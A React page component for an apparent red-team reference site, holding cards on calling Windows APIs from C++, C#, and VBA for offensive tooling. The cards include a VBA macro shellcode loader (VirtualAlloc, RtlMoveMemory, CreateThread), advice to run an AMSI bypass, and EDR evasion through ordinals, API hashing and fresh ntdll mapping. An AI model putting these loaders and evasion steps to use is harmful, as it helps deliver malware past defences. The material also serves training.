import React, { useState } from 'react';
import TechniqueCard from '../components/TechniqueCard';
import MapNode from '../components/MapNode';
import AddCardModal from '../components/AddCardModal';
import { Plus, X } from 'lucide-react';

const initialMapColumns = [
  {
    header: 'DIRECT API CALLS',
    color: 'red',
    nodes: [
      { title: 'WinAPI (C++)', subtitle: 'CreateProcess • MessageBox • NT APIs', id: 'winapi-cpp' },
      { title: 'P/Invoke (C#)', subtitle: 'DllImport • marshalling • ordinals', id: 'pinvoke' },
    ]
  },
  {
    header: 'DYNAMIC INVOCATION',
    color: 'orange',
    nodes: [
      { title: 'D/Invoke', subtitle: 'Dynamic invocation • API hashing', id: 'dinvoke' },
      { title: 'VBA WinAPI', subtitle: 'MessageBox • CreateProcess in VBA', id: 'vba-api' },
    ]
  },
  {
    header: 'ERROR HANDLING',
    color: 'yellow',
    nodes: [
      { title: 'Error Handling', subtitle: 'GetLastError • NTSTATUS • exceptions', id: 'error-handling' },
    ]
  },
];

const techniques = [
  {
    id: 'winapi-cpp',
    title: 'Windows API in C++ — WinAPI & NT APIs',
    subtitle: 'Call Win32 and NT native APIs directly from C++ for offensive tooling development',
    tags: ['WinAPI', 'C++', 'NT APIs', 'CreateProcess', 'NtAllocateVirtualMemory', 'ordinals'],
    accentColor: 'red',
    overview: 'Win32 APIs are the standard interface to Windows but are heavily hooked by EDR. NT APIs in ntdll.dll sit one layer closer to the kernel and are less commonly monitored, making them preferred for offensive tooling.',
    steps: [
      'Use Win32 APIs (kernel32.dll) for prototyping — well documented with straightforward C++ calling conventions',
      'Prefer NT APIs (Nt/Zw prefix in ntdll.dll) for sensitive operations — fewer EDR hooks, closer to the kernel',
      'Include winternl.h and define missing NT API typedefs manually; link against ntdll.lib or resolve at runtime',
      'Fill OBJECT_ATTRIBUTES and UNICODE_STRING structures manually when calling NT APIs that require them',
      'Resolve sensitive functions by ordinal (GetProcAddress with "#1234") to avoid leaving their string names in the import table',
      'Compile with cl.exe or MinGW; pass -lntdll when linking against NT functions directly',
    ],
    commands: [
      {
        title: 'WinAPI and NT API usage in C++',
        code: `// Win32 API — CreateProcess
#include <windows.h>

int main() {
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    CreateProcess(
        L"C:\\Windows\\System32\\calc.exe",   // Application
        NULL,                                   // Command line
        NULL, NULL,                             // Process/thread attrs
        FALSE,                                  // Inherit handles
        CREATE_NEW_CONSOLE,                     // Creation flags
        NULL, NULL,                             // Env, dir
        &si, &pi
    );
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return 0;
}

// NT API — NtCreateProcess (lower level)
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, PVOID ObjectAttributes,
    HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument,
    ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaxStackSize, PVOID AttributeList
);

// Resolve by ordinal (avoids string "NtCreateThreadEx" in import table)
HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
FARPROC pFunc = GetProcAddress(hNtdll, "NtCreateThreadEx");

// Compile: cl.exe tool.cpp /link /out:tool.exe
// MinGW: x86_64-w64-mingw32-g++ tool.cpp -o tool.exe -lntdll`
      }
    ]
  },
  {
    id: 'pinvoke',
    title: 'P/Invoke — Calling Win32 APIs from C#',
    subtitle: 'Use Platform Invoke to call unmanaged Win32/NT functions from managed .NET code',
    tags: ['P/Invoke', 'DllImport', 'C#', 'type marshalling', 'IntPtr', 'unsafe'],
    accentColor: 'red',
    overview: 'P/Invoke allows C# to call unmanaged Win32 and NT functions using the DllImport attribute. AMSI can scan P/Invoke declarations in .NET assemblies, so sensitive calls should be moved to D/Invoke.',
    steps: [
      'Declare each Win32 function with [DllImport("kernel32.dll", SetLastError = true)] above a matching static extern method',
      'Map Win32 types to .NET equivalents: DWORD → uint, HANDLE → IntPtr, LPWSTR → string, void* → IntPtr',
      'Use [MarshalAs] and [StructLayout(LayoutKind.Sequential)] for structs passed by reference',
      'Set SetLastError = true on every DllImport so Marshal.GetLastWin32Error() works after failures',
      'For NT APIs, use DllImport("ntdll.dll") with the matching Nt* function signature',
      'Use ordinal-based P/Invoke (EntryPoint = "#1656") to avoid the function name appearing in IL metadata',
      'Replace DllImport entirely with D/Invoke delegates for sensitive calls to eliminate import table entries',
    ],
    commands: [
      {
        title: 'P/Invoke declarations and usage',
        code: `// C# P/Invoke — WinAPI declarations
using System;
using System.Runtime.InteropServices;

class WinApi {
    // CreateProcess
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation
    );
    
    // VirtualAlloc
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
    );
    
    // NT API — NtWriteVirtualMemory
    [DllImport("ntdll.dll")]
    static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle, IntPtr BaseAddress,
        byte[] Buffer, uint NumberOfBytesToWrite,
        ref uint NumberOfBytesWritten
    );
    
    // Type marshalling example
    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }
    
    // Usage
    static void Main() {
        IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x40); // MEM_COMMIT|RESERVE, RWX
        // Copy shellcode to mem
        // ...
    }
}`
      },
      {
        title: 'Ordinal-based P/Invoke',
        code: `// Ordinal P/Invoke — avoids function name string in .NET assembly
// Useful when strings like "VirtualAlloc" are AMSI-scanned

// Find ordinal with: dumpbin /exports kernel32.dll | findstr VirtualAlloc
// VirtualAlloc ordinal in kernel32.dll = 1656 (varies by Windows version)

[DllImport("kernel32.dll", EntryPoint = "#1656")]
static extern IntPtr VirtualAllocOrd(
    IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
);

// Or define a delegate and use D/Invoke instead (better approach)
// Delegate avoids all import table entries

public delegate IntPtr VirtualAllocDelegate(
    IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
);

// Resolve dynamically:
IntPtr funcAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
VirtualAllocDelegate VirtualAlloc = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(funcAddr);
IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x40);`
      }
    ]
  },
  {
    id: 'dinvoke',
    title: 'D/Invoke — Dynamic API Invocation',
    subtitle: 'Call Win32/NT APIs without P/Invoke import table entries using delegates',
    tags: ['D/Invoke', 'API hashing', 'delegates', 'dynamic invocation', 'ordinals', 'SharpSploit'],
    accentColor: 'orange',
    overview: 'D/Invoke resolves function addresses at runtime using delegates, leaving no DllImport entries in the .NET IL that AMSI or EDR can inspect. API hashing extends this by removing all function name strings from the binary.',
    steps: [
      'Define a delegate type matching the target Win32 function signature with [UnmanagedFunctionPointer(CallingConvention.StdCall)]',
      'Resolve the function address at runtime via GetProcAddress or manual Export Address Table (EAT) walking',
      'Create a callable delegate from the pointer with Marshal.GetDelegateForFunctionPointer<T>(addr)',
      'Invoke the delegate — no DllImport attribute exists in the assembly, leaving no import table entry',
      'Upgrade to API hashing: pre-compute a CRC32/DJB2 hash of each target function name; walk the EAT comparing hashes — eliminates all function name strings from the binary',
      'Use manual DLL mapping to load a fresh copy of ntdll.dll from disk into a private buffer, bypassing in-memory EDR hooks',
    ],
    commands: [
      {
        title: 'D/Invoke implementation',
        code: `// D/Invoke — dynamic function resolution without DllImport
using System;
using System.Runtime.InteropServices;
using System.Reflection;

class DInvoke {
    // Step 1: Define a delegate for the function signature
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate IntPtr VirtualAllocDelegate(
        IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect
    );
    
    // Step 2: Resolve the function address at runtime
    static IntPtr GetFuncAddr(string module, string funcName) {
        IntPtr hModule = LoadLibrary(module);  // Or use existing handle
        return GetProcAddress(hModule, funcName);
    }
    
    // Helper imports (only these appear in import table — benign)
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string name);
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string lib);
    
    static void Main() {
        // Step 3: Get function pointer
        IntPtr funcAddr = GetFuncAddr("kernel32.dll", "VirtualAlloc");
        
        // Step 4: Create delegate from pointer
        VirtualAllocDelegate VirtualAlloc = Marshal.GetDelegateForFunctionPointer<VirtualAllocDelegate>(funcAddr);
        
        // Step 5: Call the function — no import table entry for VirtualAlloc
        IntPtr mem = VirtualAlloc(IntPtr.Zero, 4096, 0x3000, 0x40);
    }
}

// API Hashing version — resolve by CRC32 hash (no string "VirtualAlloc" anywhere)
// Hash of "VirtualAlloc" = 0xE553A458 (example)
// Walk EAT of kernel32.dll, compute hash of each name, match against 0xE553A458
// Return the function address when hash matches`
      }
    ]
  },
  {
    id: 'vba-api',
    title: 'VBA WinAPI Calls',
    subtitle: 'Declare and call Win32 APIs directly from VBA macros in Office documents',
    tags: ['VBA', 'Declare', 'CreateProcess', 'MessageBox', 'Win32 from VBA', 'Office'],
    accentColor: 'orange',
    overview: 'VBA macros in Office documents can declare and call Win32 APIs directly using the Declare statement, enabling shellcode execution from a document without any external binary. AMSI scans VBA since Office 2016, so an inline AMSI bypass is required.',
    steps: [
      'Add the #If VBA7 conditional block to use PtrSafe Declare for 64-bit Office; without it the macro errors on 64-bit hosts',
      'Declare each Win32 function with Declare PtrSafe Function, mapping types: Long for DWORD/HANDLE, LongPtr for pointers, Any for void*',
      'Run an AMSI bypass sub at the very start of the macro — AMSI has scanned VBA in Office 2016+ and will flag shellcode allocation calls',
      'Allocate shellcode memory with VirtualAlloc (use RW + VirtualProtect to RX; avoid RWX for OPSEC)',
      'Copy shellcode bytes into the allocation with RtlMoveMemory',
      'Create and execute a thread at the shellcode address with CreateThread, then wait for it to complete',
    ],
    commands: [
      {
        title: 'VBA WinAPI declarations',
        code: `' VBA WinAPI — CreateProcess and shellcode execution
#If VBA7 Then
    Private Declare PtrSafe Function CreateProcess Lib "kernel32" Alias "CreateProcessA" ( _
        ByVal lpApplicationName As String, _
        ByVal lpCommandLine As String, _
        lpProcessAttributes As SECURITY_ATTRIBUTES, _
        lpThreadAttributes As SECURITY_ATTRIBUTES, _
        ByVal bInheritHandles As Boolean, _
        ByVal dwCreationFlags As Long, _
        lpEnvironment As Any, _
        ByVal lpCurrentDirectory As String, _
        lpStartupInfo As STARTUPINFO, _
        lpProcessInformation As PROCESS_INFORMATION) As Long

    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" ( _
        ByVal lpAddress As LongPtr, ByVal dwSize As Long, _
        ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" ( _
        ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long)

    Private Declare PtrSafe Function CreateThread Lib "kernel32" ( _
        lpThreadAttributes As Any, ByVal dwStackSize As Long, _
        ByVal lpStartAddress As LongPtr, lpParameter As Any, _
        ByVal dwCreationFlags As Long, lpThreadId As Long) As LongPtr
#End If

Sub RunShellcode()
    Dim sc() As Byte
    sc = Array(...)  ' Shellcode bytes
    
    Dim addr As LongPtr
    addr = VirtualAlloc(0, UBound(sc), &H3000, &H40)  ' MEM_COMMIT|RESERVE, RWX
    RtlMoveMemory addr, sc(0), UBound(sc)
    
    Dim tid As Long
    CreateThread ByVal 0&, 0, addr, ByVal 0&, 0, tid
End Sub`
      }
    ]
  },
  {
    id: 'error-handling',
    title: 'Windows Error Handling',
    subtitle: 'Correctly handle errors from Win32 and NT API calls in offensive C++/C# tools',
    tags: ['GetLastError', 'NTSTATUS', 'FormatMessage', 'error codes', 'NT_SUCCESS'],
    accentColor: 'yellow',
    overview: 'Correct error handling is critical in offensive tools — silent failures cause unpredictable behaviour and can burn an operation. Always check return values immediately and call GetLastError before any other API.',
    steps: [
      'Check every Win32 return value immediately: NULL / FALSE / INVALID_HANDLE_VALUE all indicate failure',
      'Call GetLastError() as the very next statement after a failure — any subsequent API call overwrites the error code',
      'Pass the DWORD to FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM) to convert it to a human-readable string',
      'For NT API calls check NT_SUCCESS(status) — any NTSTATUS value ≥ 0 is success; negative values are errors',
      'In C#: ensure SetLastError = true on the DllImport declaration, then call Marshal.GetLastWin32Error() (not Environment.GetLastWin32Error())',
      'Map common codes early: 0x5 = Access Denied, 0x57 = Invalid Parameter, 0xC0000022 = STATUS_ACCESS_DENIED',
    ],
    commands: [
      {
        title: 'Error handling patterns',
        code: `// C++ Win32 error handling
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);
if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
    DWORD err = GetLastError();
    // Format message
    LPSTR msg = NULL;
    FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
        NULL, err, 0, (LPSTR)&msg, 0, NULL);
    printf("OpenProcess failed: %d - %s\n", err, msg);
    LocalFree(msg);
    return -1;
}

// NTSTATUS error handling (NT APIs)
NTSTATUS status = NtAllocateVirtualMemory(hProcess, &addr, 0, &size, MEM_COMMIT, PAGE_READWRITE);
if (!NT_SUCCESS(status)) {  // NT_SUCCESS = (status >= 0)
    printf("NtAllocateVirtualMemory failed: 0x%08X\n", status);
    // Common NTSTATUS codes:
    // 0xC0000005 = STATUS_ACCESS_VIOLATION
    // 0xC0000022 = STATUS_ACCESS_DENIED
    // 0xC000000D = STATUS_INVALID_PARAMETER
    return -1;
}

// C# error handling
[DllImport("kernel32.dll", SetLastError = true)]  // SetLastError=true is required!
static extern IntPtr OpenProcess(uint access, bool inherit, uint pid);

IntPtr hProcess = OpenProcess(0x1FFFFF, false, targetPid);
if (hProcess == IntPtr.Zero) {
    int err = Marshal.GetLastWin32Error();  // NOT Environment.GetLastWin32Error()
    Console.WriteLine($"OpenProcess failed: {err}");
}`
      }
    ]
  },
];

const colorOptions=[{value:'cyan',name:'Cyan'},{value:'green',name:'Green'},{value:'red',name:'Red'},{value:'purple',name:'Purple'},{value:'orange',name:'Orange'},{value:'pink',name:'Pink'},{value:'blue',name:'Blue'},{value:'yellow',name:'Yellow'}];
const colorPreview={cyan:'bg-cyan-500',green:'bg-emerald-500',red:'bg-red-500',purple:'bg-purple-500',orange:'bg-orange-500',pink:'bg-pink-500',blue:'bg-blue-500',yellow:'bg-yellow-500'};
const headerColorMap={cyan:'text-cyan-400 border-cyan-500/30',green:'text-emerald-400 border-emerald-500/30',red:'text-red-400 border-red-500/30',purple:'text-purple-400 border-purple-500/30',orange:'text-orange-400 border-orange-500/30',pink:'text-pink-400 border-pink-500/30',blue:'text-blue-400 border-blue-500/30',yellow:'text-yellow-400 border-yellow-500/30'};

export default function WindowsAPIs() {
  const [columns,setColumns]=useState(initialMapColumns);
  const [modalStep,setModalStep]=useState(null);
  const [columnName,setColumnName]=useState('');
  const [selectedColor,setSelectedColor]=useState('cyan');
  const [addingTopicCol,setAddingTopicCol]=useState(null);
  const [topicTitle,setTopicTitle]=useState('');
  const [topicTags,setTopicTags]=useState('');
  const [customCards,setCustomCards]=useState([]);
  const [cardModalOpen,setCardModalOpen]=useState(false);
  const handleAddColumnStart=()=>setModalStep('name');
  const handleNameSubmit=()=>{if(columnName.trim())setModalStep('color');};
  const handleColorSubmit=()=>{setColumns([...columns,{header:columnName.toUpperCase(),color:selectedColor,nodes:[]}]);setModalStep(null);setSelectedColor('cyan');setColumnName('');};
  const handleDeleteColumn=(i)=>setColumns(columns.filter((_,idx)=>idx!==i));
  const handleAddTopic=(ci)=>{if(topicTitle.trim()){const u=[...columns];u[ci].nodes.push({title:topicTitle,subtitle:'Add details here',tags:topicTags.split(',').map(t=>t.trim()).filter(t=>t)});setColumns(u);setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}};
  const handleDeleteTopic=(ci,ni)=>{const u=[...columns];u[ci].nodes.splice(ni,1);setColumns(u);};
  const handleAddCard=(card)=>setCustomCards([...customCards,card]);
  const handleDeleteCard=(id)=>setCustomCards(customCards.filter(c=>c.id!==id));
  const scrollTo=(id)=>{const el=document.getElementById(id);if(el)el.scrollIntoView({behavior:'smooth',block:'start'});};
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight"><span className="text-slate-200">Windows </span><span className="text-red-400">APIs</span></h1>
        <p className="text-slate-500 font-mono text-sm mt-3">WinAPI C++ • P/Invoke • D/Invoke • VBA APIs • Error Handling</p>
      </div>
      <div className="overflow-x-auto pb-4"><div className="inline-flex gap-4 min-w-max">
        {columns.map((col,i)=>{const color=col.color||'cyan';return(
          <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
            <div className={`text-center py-2 border-b-2 mb-2 ${headerColorMap[color]} flex items-center justify-between px-2`}>
              <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">{col.header}</span>
              <button onClick={()=>handleDeleteColumn(i)} className="text-slate-500 hover:text-slate-300 p-0.5"><X className="w-3 h-3"/></button>
            </div>
            <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
              {col.nodes.map((node,j)=>(<div key={j} className="flex items-start gap-1 group"><div className="flex-1 min-w-0"><MapNode title={node.title} subtitle={node.tags&&node.tags.length>0?node.tags.join(' • '):node.subtitle} accentColor={color} onClick={()=>scrollTo(node.id)} small/></div><button onClick={()=>handleDeleteTopic(i,j)} className="text-slate-600 hover:text-red-400 p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"><X className="w-3 h-3"/></button></div>))}
              {addingTopicCol===i?(<div className="flex flex-col gap-1"><input type="text" value={topicTitle} onChange={e=>setTopicTitle(e.target.value)} placeholder="Topic name" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none" autoFocus onKeyDown={e=>{if(e.key==='Escape'){setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}}}/>
              <input type="text" value={topicTags} onChange={e=>setTopicTags(e.target.value)} placeholder="Tags (comma-separated)" className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none" onKeyDown={e=>{if(e.key==='Enter')handleAddTopic(i);if(e.key==='Escape'){setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}}}/>
              <div className="flex gap-1"><button onClick={()=>handleAddTopic(i)} className="flex-1 px-2 py-1 bg-red-600 hover:bg-red-700 text-white text-xs font-mono rounded">Add</button><button onClick={()=>{setAddingTopicCol(null);setTopicTitle('');setTopicTags('');}} className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded">Cancel</button></div></div>
              ):(<button onClick={()=>setAddingTopicCol(i)} className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500">+ Add Topic</button>)}
            </div>
          </div>
        );})}
        <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]"><button onClick={handleAddColumnStart} className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20"><Plus className="w-6 h-6 text-slate-500"/><span className="text-xs font-mono text-slate-500 text-center">Add Column</span></button></div>
      </div></div>
      {modalStep&&(<div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50"><div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
        {modalStep==='name'&&(<div className="space-y-4"><h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3><input type="text" value={columnName} onChange={e=>setColumnName(e.target.value)} placeholder="e.g., Custom Category" className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none" autoFocus onKeyDown={e=>e.key==='Enter'&&handleNameSubmit()}/><div className="flex gap-2"><button onClick={()=>setModalStep(null)} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 font-mono text-sm">Cancel</button><button onClick={handleNameSubmit} className="flex-1 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 font-mono text-sm font-semibold">Next</button></div></div>)}
        {modalStep==='color'&&(<div className="space-y-4"><h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3><div className="flex flex-col gap-2 max-h-64 overflow-y-auto">{colorOptions.map(o=>(<button key={o.value} onClick={()=>setSelectedColor(o.value)} className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold flex items-center gap-2 ${selectedColor===o.value?`${colorPreview[o.value]} text-slate-900`:'bg-slate-800 text-slate-300 hover:bg-slate-700'}`}><div className={`w-3 h-3 rounded-full ${colorPreview[o.value]}`}/>{o.name}</button>))}</div><div className="flex gap-2"><button onClick={()=>setModalStep('name')} className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 font-mono text-sm">Back</button><button onClick={handleColorSubmit} className="flex-1 px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 font-mono text-sm font-semibold">Create</button></div></div>)}
      </div></div>)}
      <div><button onClick={()=>setCardModalOpen(true)} className="px-3 py-1.5 bg-red-600 hover:bg-red-700 text-white text-xs font-mono rounded flex items-center gap-1"><Plus className="w-3 h-3"/> Add Technique</button></div>
      {customCards.length>0&&(<div className="border-t border-slate-800/50 pt-8"><h2 className="text-xl font-bold font-mono text-slate-200 mb-4">Custom Techniques</h2><div className="grid grid-cols-1 gap-4">{customCards.map(card=>(<div key={card.id} className="relative"><TechniqueCard title={card.title} subtitle={card.subtitle} tags={card.tags} accentColor={card.accentColor} overview={card.overview} steps={card.steps} commands={card.commands}/><button onClick={()=>handleDeleteCard(card.id)} className="absolute top-4 right-4 text-slate-600 hover:text-red-400 p-1 z-10"><X className="w-4 h-4"/></button></div>))}</div></div>)}
      <AddCardModal isOpen={cardModalOpen} onClose={()=>setCardModalOpen(false)} onSubmit={handleAddCard}/>
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">{techniques.map((t)=>(<div key={t.id} id={t.id}><TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands}/></div>))}</div>
    </div>
  );
}